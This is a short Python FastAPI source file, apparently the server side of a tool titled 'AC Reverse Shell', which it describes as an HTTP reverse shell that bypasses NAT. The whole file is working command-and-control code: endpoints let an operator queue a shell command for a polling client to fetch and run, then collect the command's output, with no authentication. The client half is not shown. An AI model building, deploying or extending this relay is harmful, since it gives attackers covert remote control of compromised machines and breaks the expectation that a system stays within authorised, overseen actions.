from fastapi import FastAPI, Body

app = FastAPI()

CURRENT_CMD = ""
CMD_OUTPUT = ""


@app.get("/")
async def index():
    return {"title": "AC Reverse Shell", "description": "HTTP Reverse Shell which bypasses NAT"}

@app.get("/ping")
async def ping_pong():
    return "pong"


@app.get("/shell/cmd")  # get current cmd
async def get_cmd():
    global CURRENT_CMD
    return {"cmd": CURRENT_CMD}

@app.post("/shell/cmd")  # store current cmd
async def post_cmd(cmd: str = Body(...)):
    global CURRENT_CMD
    CURRENT_CMD = cmd
    return {"response": "ok"}

@app.delete("/shell/cmd")  # clear current cmd
async def delete_cmd():
    global CURRENT_CMD
    CURRENT_CMD = ""
    return {"response": "ok"}


@app.get("/shell/output")  # get last cmd output
async def get_output():
    global CMD_OUTPUT
    return {"output": CMD_OUTPUT}

@app.post("/shell/output")  # store new cmd output
async def post_output(output: str = Body(...)):
    global CMD_OUTPUT
    CMD_OUTPUT = output
    return {"response": "ok"}

@app.delete("/shell/output")  # clear last cmd output
async def delete_output():
    global CMD_OUTPUT
    CMD_OUTPUT = ""
    return {"response": "ok"}
